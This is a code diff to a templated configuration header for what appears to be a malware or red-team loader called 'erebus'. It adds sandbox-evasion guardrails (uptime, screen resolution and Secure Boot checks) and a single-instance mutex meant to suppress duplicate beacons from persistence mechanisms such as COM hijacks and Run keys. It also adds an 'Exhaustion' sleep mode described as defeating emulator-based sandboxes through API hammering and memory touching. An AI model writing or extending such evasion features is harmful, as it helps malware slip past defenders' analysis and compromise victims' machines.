@@ -109,6 +109,18 @@
 // Additional targeting checks. These default to 0 so existing builds
 // behave identically. Flip via new builder parameters when rolling out.
 #define CONFIG_GUARDRAILS_CHECK_DOMAIN_JOINED {{ GUARDRAILS_CHECK_DOMAIN_JOINED | default(0) }}
+#define CONFIG_GUARDRAILS_CHECK_UPTIME {{ GUARDRAILS_CHECK_UPTIME | default(0) }}
+#define CONFIG_GUARDRAILS_UPTIME_MIN_SECONDS {{ GUARDRAILS_UPTIME_MIN_SECONDS | default(300) }}
+#define CONFIG_GUARDRAILS_CHECK_SCREEN_RESOLUTION {{ GUARDRAILS_CHECK_SCREEN_RESOLUTION | default(0) }}
+#define CONFIG_GUARDRAILS_CHECK_SECURE_BOOT {{ GUARDRAILS_CHECK_SECURE_BOOT | default(0) }}
+
+// Single-instance mutex guard. When enabled, the loader creates a named
+// mutex under the Global\ namespace on startup. If the mutex already exists
+// the loader exits silently, preventing duplicate beacons from persistence
+// mechanisms (COM hijacks, Run key) or re-delivery of the same lure.
+// 0 = disabled (default)
+// 1 = enabled
+#define CONFIG_SINGLE_INSTANCE {{ SINGLE_INSTANCE | default(0) }}
 
 // Decoy file to open when guardrails fail (empty = silent exit)
 #define CONFIG_GUARDRAILS_DECOY_FILE "{{ GUARDRAILS_DECOY_FILE }}"
@@ -157,9 +169,14 @@
 // SLEEP OBFUSCATION CONFIGURATION
 // ============================================
 // Pre-injection dwell mode:
-// 0 = None      - no dwell (execute immediately)
-// 1 = Timer     - WaitableTimer jittered dwell (anti-sandbox timing bypass)
-// 2 = Ekko-lite - Timer + XOR non-.text PE sections during wait
+// 0 = None        - no dwell (execute immediately)
+// 1 = Timer       - WaitableTimer jittered dwell (anti-sandbox timing bypass)
+// 2 = Ekko-lite   - Timer + XOR non-.text PE sections during wait
+// 3 = Exhaustion  - Fibonacci burn + API hammering (100k CloseHandle) +
+//                   100 MB memory touch, then WaitableTimer wait.
+//                   Defeats emulator-based sandboxes by exhausting their
+//                   per-instruction and per-syscall simulation budget.
+//                   Recommended base_ms: 90000 (90 seconds)
 #ifndef CONFIG_SLEEP_OBFUSCATION_TYPE
 #define CONFIG_SLEEP_OBFUSCATION_TYPE {{ SLEEP_OBFUSCATION_TYPE | default(0) }}
 #endif
@@ -288,6 +305,10 @@ inline erebus::guardrails::GuardrailConfig GetGuardrailConfig() {
         config.check_timing_checks         = CONFIG_GUARDRAILS_CHECK_TIMING;
         config.check_sandbox_environment   = CONFIG_GUARDRAILS_CHECK_SANDBOX;
         config.check_domain_joined         = CONFIG_GUARDRAILS_CHECK_DOMAIN_JOINED;
+        config.check_uptime                = CONFIG_GUARDRAILS_CHECK_UPTIME;
+        config.uptime_min_seconds          = CONFIG_GUARDRAILS_UPTIME_MIN_SECONDS;
+        config.check_screen_resolution     = CONFIG_GUARDRAILS_CHECK_SCREEN_RESOLUTION;
+        config.check_secure_boot           = CONFIG_GUARDRAILS_CHECK_SECURE_BOOT;
 
         {% if GUARDRAIL_ALLOWED_PARENTS %}
         static const char* g_gr_allowed_parents[] = {
